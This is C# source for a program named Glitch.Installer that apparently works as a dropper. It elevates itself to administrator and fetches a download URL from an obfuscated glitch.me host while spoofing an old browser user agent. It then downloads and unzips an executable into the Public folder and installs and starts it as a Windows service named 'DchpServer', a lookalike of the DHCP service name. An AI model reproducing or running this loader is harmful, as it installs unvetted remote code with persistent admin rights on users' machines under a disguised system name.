using System.Reflection;
using System.Configuration.Install;
using System.Diagnostics;
using System.Security.Principal;
using System.Net;
using System.IO.Compression;
using System.IO;
using System.ServiceProcess;
using Newtonsoft.Json;
using System.Linq;
using System.Threading.Tasks;
using System;

namespace Glitch.Installer
{
    class Program
    {
        static void Main()
        {
            if (IsAdministrator() == false)
            { 

                try
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo(Assembly.GetExecutingAssembly().Location)
                    {
                        UseShellExecute = true,
                        Verb = "runas"
                    };
                    Process.Start(startInfo);
                } catch
                {
                    Console.WriteLine("Пожалуйста, запускайте файл через проводник!");
                }
            }
            if (IsAdministrator() == true)
            {
                ServiceController ctl = ServiceController.GetServices().FirstOrDefault(s => s.ServiceName == "DchpServer");
                if (ctl != null)
                {
                    ProcessStartInfo startInfo2 = new ProcessStartInfo("C:/Windows/System32/sc.exe")
                    {
                        UseShellExecute = false,
                        Arguments = "stop DchpServer",
                    };
                    Process.Start(startInfo2);
                    ProcessStartInfo startInfo3 = new ProcessStartInfo("C:/Windows/System32/sc.exe")
                    {
                        UseShellExecute = false,
                        Arguments = "delete DchpServer",
                    };
                    Process.Start(startInfo3);
                }
                using (var client = new WebClient())
                {
                    client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; " +
                                  "Windows NT 5.2; .NET CLR 1.0.3705;)");
                    string root = @"C:\Users\Public\Glitch";
                    // If directory does not exist, don't even try   
                    if (Directory.Exists(root))
                    {
                        string[] files = Directory.GetFiles("C:/Users/Public/Glitch/Temp");
                        foreach (string file in files)
                        {
                            File.Delete(file);
                        }
                        Directory.Delete("C:/Users/Public/Glitch/Temp");
                        string[] files2 = Directory.GetFiles(root);
                        foreach (string file in files2)
                        {
                            File.Delete(file);
                        }
                        Directory.Delete(root);
                    }
                    Directory.CreateDirectory("C:/Users/Public/Glitch");
                    Directory.CreateDirectory("C:/Users/Public/Glitch/Temp");
                    dynamic json = JsonConvert.DeserializeObject(client.DownloadString("https://chjlaw5zdgfsbdf0amf0ag--.glitch.me/cHJlaW5zdGFsbDF0amF0ag==.json"));
                    string url = json.url;
                    client.DownloadFile(url, "C:/Users/Public/Glitch/Temp/glitch.zip");
                    System.Threading.Thread.Sleep(5000);
                }
                    ZipFile.ExtractToDirectory("C:/Users/Public/Glitch/Temp/glitch.zip", "C:/Users/Public/Glitch/");
                    ManagedInstallerClass.InstallHelper(new string[] { "C:/Users/Public/Glitch/Glitch.exe" });
                    ProcessStartInfo startInfo = new ProcessStartInfo("C:/Windows/System32/sc.exe")
                    {
                        UseShellExecute = false,
                        Arguments = "start DchpServer",
                    };
                    Process.Start(startInfo);
            }
        }

        private static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
	}
}
